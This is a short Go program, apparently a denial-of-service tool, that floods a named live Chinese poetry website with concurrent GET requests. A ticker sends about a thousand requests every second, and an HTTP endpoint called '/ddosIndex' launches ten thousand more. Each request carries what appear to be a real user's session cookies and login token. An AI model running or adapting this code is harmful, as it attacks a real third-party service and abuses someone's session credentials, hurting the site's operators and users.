package main

import (
	"fmt"
	"gin_reay/bootstrapt"
	"github.com/gin-gonic/gin"
	log "github.com/xiaomi-tc/log15"
	"io"
	"net/http"
	"time"
)

const RequestUrl = "https://www.52shici.com/index.php"

func main() {

	r := gin.Default()

	//初始化日志
	bootstrapt.InitLog()

	r.GET("/ddosIndex", func(context *gin.Context) {
		go DDosHandle(10000)
	})
	tick := time.NewTicker(time.Second * 1)
	for range tick.C {
		fmt.Println("ticker start...")
		DDosHandle(1000)
		fmt.Println("ticker end...")
	}

	// 启动服务器
	err := r.Run(":8080")
	if err != nil {
		return
	}
}

func DDosHandle(number int) {
	for i := 0; i <= number; i++ {
		go HttpRequestGet()
	}
}

func HttpRequestGet() {
	client := &http.Client{}
	// 创建一个新的http GET请求
	req, err := http.NewRequest("GET", RequestUrl, nil)
	req.Header.Set("Cookie", "last_login_type=wx; PHPSESSID=d5d7868cbbdba243355509dd42fe6520; autoLogin=yes; mem_token=2a2ae09566c029cb2b18a3fd50c96b9b; mem_id=149936; mem_name=%E9%98%BF%E7%99%BD190925")
	if err != nil {
		fmt.Println(err.Error())
		return
	}

	// 发起请求
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
		}
	}(resp.Body)

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	log.Info("edu", "status", resp.Status, "ContentLength", resp.ContentLength, "bodyLength", len(string(body)))
	return
}
